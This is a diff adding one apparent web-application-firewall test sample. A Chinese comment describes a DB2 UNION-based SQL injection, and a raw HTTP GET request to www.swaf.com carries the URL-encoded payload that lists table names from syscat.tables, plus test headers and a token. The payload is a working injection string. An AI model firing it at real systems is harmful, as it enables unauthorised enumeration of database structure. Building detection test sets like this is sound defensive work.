@@ -1,0 +1,9 @@
+# SQL注入_GET_db2_普通注入-06506478
+# 基于UNION查询，该语句尝试使用UNION注入方式，从syscat.tables表中选择当前模式下的表名。通过获得数据库中当前模式下的表名，攻击者可以了解数据库结构和当前模式中存在的表。这些信息可以帮助攻击者识别目标数据库中的敏感数据表或可能具有潜在漏洞的表。
+GET /?id=1%20union%20select%20tabname%20from%20syscat.tables%20where%20tabschema=current%20schema&bid=hd_tag_m8mv26le HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26le
+RM-PRO-Token: b09c2ceb9d650f065c1f487d7e9b97be
+RM-PRO-Time: 1742808631943
+User-Agent: curl/7.83.1
+
